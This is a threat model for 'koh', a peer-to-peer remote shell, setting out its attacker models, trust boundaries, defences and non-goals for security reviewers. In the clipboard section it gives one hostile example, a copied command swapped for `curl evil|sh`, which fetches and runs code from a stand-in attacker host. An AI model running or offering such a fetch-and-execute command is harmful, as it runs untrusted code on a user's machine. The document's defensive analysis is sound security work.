# koh threat model

A map of who koh defends against, the trust boundaries, the properties it provides, and — as
importantly — what it explicitly does **not** try to do. This exists so a reviewer knows where to
look; pair it with [`SECURITY.md`](../SECURITY.md).

## What koh is

A mosh-like remote shell over [iroh](https://iroh.computer) (peer-to-peer QUIC). The **server** spawns
a real shell in a PTY and sends its screen to a **client** as frames over QUIC streams.
There is **no listening port**: a server is reachable only via its non-enumerable Ed25519 **node-id**
(through relays + NAT hole-punching), and only peers on its **allowlist** are admitted. It is a
**single-operator** tool for connecting a small set of machines you control — not a multi-user network
service.

## Attacker models

1. **Malicious / compromised client** — a peer that dials the server. If it is on the allowlist it
   reaches the koh/3 data plane: it sends arbitrary input, resize, ack and resync messages and opens
   streams. Input comes as raw bytes (`Input`) or decoded events (`Keys`: keys, mouse events, focus
   changes, paste pieces); decoding refuses what no terminal sends (a modifier bit no key has, a
   function key past F12, a kitty code that is no Unicode scalar, a paste piece over 60 KiB, more
   than 512 events, more than 16 palette entries in `Colours`) and closes the connection. The server
   encodes events with fux-vt for the program's modes; a paste's end markers are removed from every
   piece, so even a hostile client cannot end a program's bracketed paste early with paste text
   (it can type anything else, as any client can).
   **Goal it must be denied:** crash / OOM / hang the server, bypass a cap, or escape the admission
   gauntlet. The server is the high-value target (it runs a shell).
2. **Malicious / compromised server** — a server a client dials (a wrong/typo'd node-id, or a popped
   host). It sends arbitrary screen-state instructions + out-of-band data (title/icon/bell/clipboard).
   **Goal it must be denied:** crash / OOM / hang the client, or leave lasting state in the user's
   terminal (its palette, modes, keyboard flags). It *can* mislead a user who chose to connect to
   it — that is inherent, and with no second factor the node-id is the only thing tying a session
   to a specific server, so node-ids should be verified out-of-band.
   **The clipboard:** clipboard writes (OSC 52) are on by default, by the owner's choice, so a
   remote program's copy works. A hostile server can therefore replace what the user copied (a
   command swapped for `curl evil|sh`); `koh connect --no-clipboard` turns them off, and a user
   who does not trust the server should pass it. What bounds them: only base64 of at most 16 KiB is
   forwarded, always to the `c` selection; the clipboard is never read (a query, `OSC 52 ; c ; ?`,
   is neither forwarded nor answered, and the client asks the user's terminal nothing), so nothing
   the user copied reaches the server.
   **Hyperlinks:** links (OSC 8) are on by default, by the owner's choice, and off with
   `koh connect --no-hyperlinks`. A server chooses the URI, so a link can point anywhere, as a link
   in any program's output can; the user's terminal shows it before opening it. What bounds them:
   on the wire a row carries at most 64 links, a URI at most fux-vt's 2,083 bytes and an id 250,
   and a frame at most 1 MiB of them (a frame over it is dropped whole), so a hostile server cannot
   make the client keep much; and before painting one the client checks it again (printable ASCII,
   no space, an id without `;` or `:`), painting a link that fails as plain text, so no escape
   sequence can ride in a URI.
   **Typed secrets:** the client predicts typing locally; at a password prompt (the PTY reads
   lines without echo, which the server reads from its modes and tells the client) nothing typed
   is predicted or shown, whatever trust the session had. The client's copy of the modes can lag
   the PTY's by up to the server's 100 ms read interval (a program that prints its prompt, then
   turns echo off): so a key typed within 200 ms of a frame that moved the cursor to another row
   (a fresh prompt) is not predicted until the server has reflected it, and a secret typed at
   once is not drawn either. A hostile server can of course claim any modes: it already sees
   every key.
   **History:** the server already holds the session's history (`--scrollback`, 1,000 lines by
   default); with the scrollback view the client now holds a part of it too, in memory, for the
   connection: at most a million cells, dropped when the connection ends. A server's history
   rows are decoded like a frame's rows (the same refusals), at most 256 rows and 65,536 cells a
   reply and 1 MiB of links, a malformed reply dropped whole; rows the screen's history mark does
   not name are not kept. A hostile client cannot make the server send more than its history, nor
   faster than the link takes: requests are answered one at a time, each once the last is
   delivered, and more than 8 waiting closes the connection.
   **Questions to the user's terminal:** the client asks it one set of questions, itself, once at
   start-up (`client::probe`: whether it draws underline styles, whether it speaks the kitty
   keyboard protocol, its colour scheme, its foreground, background and palette entries 0 to 15, and
   its device attributes), and reads the answers out of stdin before the session starts. It asks
   the colours again only when its own terminal reports a new scheme (mode 2031). Nothing a server
   sends makes the client ask the terminal anything.
   **The user's colours:** unless `koh connect --no-colours`, the client tells the server the
   colours its terminal answered (`Colours`: foreground, background, palette 0–15, dark or light),
   on every connection; the server answers programs' OSC 10, OSC 11, OSC 4 for entries 0–15 and
   `CSI ? 996 n` from them, so
   vim, bat and delta pick a matching theme. That tells the server the user's theme, a small
   fingerprint, to a server the user chose to connect to; the answers go to the program, never to
   the user's terminal, and a program asking a thousand times is answered from the server's copy,
   never by asking the user's terminal again. The underline and keyboard answers stay on the
   client.
   **The user's terminal's modes:** the client sets them itself and resets them on leaving and on
   suspend: bracketed paste and focus reporting while it runs (so pastes arrive whole and focus
   changes at all), mouse reporting in SGR while the program asks for any or the scrollback view is
   open, kitty's disambiguate and alternate keys pushed (`CSI > 5 u`, popped with `CSI < u`) if
   the terminal speaks the protocol, and scheme reports (mode 2031) if it reports a scheme. A
   server's modes are no longer mirrored for their own sake: nothing it sends sets the user's
   keyboard flags or leaves a mode set.
3. **Network / MITM** — QUIC + TLS 1.3 (via iroh) give transport encryption and node-id
   authentication by construction (no TOFU window). Considered: replay, and connection-level tamper.
4. **Local attacker** — another uid on the same host. Targets: the identity key file, the state dir,
   signals to a recycled pid, temp files.

## Trust boundaries & key defenses

- **Peer identity:** both ends are authenticated by Ed25519 node-id *by construction* (no TOFU
  window). Authorization is an explicit **allowlist** (off-list peers refused); at least one entry is
  required, so there is no "accept any peer" mode. This is the **single** authentication factor —
  there is no passphrase/PAKE second factor. A leaked key file is a leaked identity: protect it
  like an SSH private key, and remove a lost machine's id from every `--allow` list. The accept gauntlet (`src/server/cli.rs`) is the trust-boundary
  checkpoint; its outcomes are logged structured under the `koh::auth` target.
- **Untrusted data plane:** the protocol (`src/proto.rs`) and the connection cores
  (`src/server/mod.rs`, `src/client/session.rs`) are pure and panic-free by construction. Client
  messages are length-capped (64 KiB of input each) and a frame is read and inflated with a 16 MiB
  limit; each end keeps at most 16 recent screens, holding at most one screen of the largest size
  beyond the one it needs (a row several share counted once), whatever the peer sends or withholds; QUIC
  stream limits and flow control bound what a peer can have in flight; and resize dimensions are
  clamped before any grid allocation.
  **The client runs no terminal parser on server bytes:** a screen update is a structured diff of
  whole rows of run-length-encoded cells. Decoding it refuses unknown cell kinds, style bits and
  modes, empty runs, and cell text over the emulator's per-cell cap or holding a control character
  (the client prints a cell's text to the user's terminal as is, so it cannot carry an escape
  sequence); `TerminalScreen::apply` then validates the rest (row indices, runs covering exactly the
  width) before committing. A malformed frame is dropped whole. The
  server's emulator is `fux-vt`, which is panic-free by construction (its own `forbid` lints) and
  bounded: it retains no DCS/APC/PM/SOS payload and caps an OSC string at 64 KiB, so a runaway
  control string from the shell can't grow memory. koh therefore no longer wraps the emulator in
  `catch_unwind` or pre-filters control strings.
- **Process / local:** `forbid(unsafe)` crate-wide; the identity key is the raw secret, protected
  by its permissions like an SSH host key: written `0600` (born-private atomic write), read with
  `O_NOFOLLOW`, and re-tightened to 0600 through the open descriptor; a state dir another user can
  write is refused; `KOH_*` env scrubbed before exec'ing the shell; PTY kill gated against pid reuse.

The detailed finding history (security audit + the K-/AR-/CR- review series) lives in the git log and
the inline `KOH-`/`KR-`/`K-`/`AR-` rationale tags.

## Non-goals (where koh does NOT match a hardened multi-user service)

- **No privilege separation / multi-user model:** the shell runs as the uid that ran `koh serve`;
  there is no per-user mapping, PAM, chroot, or `ForceCommand`-class policy. The only access control
  is the node-id allowlist; access is uniform across allowed peers.
- **No hardware-backed / certificate / agent identity, and no at-rest encryption:** the node-id key
  lives on disk, protected by file permissions only (not in an HSM / FIDO2 token / agent).
- **No post-quantum key exchange yet:** transport crypto is inherited from iroh; koh is a policy-taker.
- **Transport crypto is not koh's:** QUIC/TLS/KEX correctness is iroh/rustls/ring's responsibility.
- **Not a substitute for ssh** where independent audit, compliance, or a multi-user/jail model is
  required — see the README's comparison.
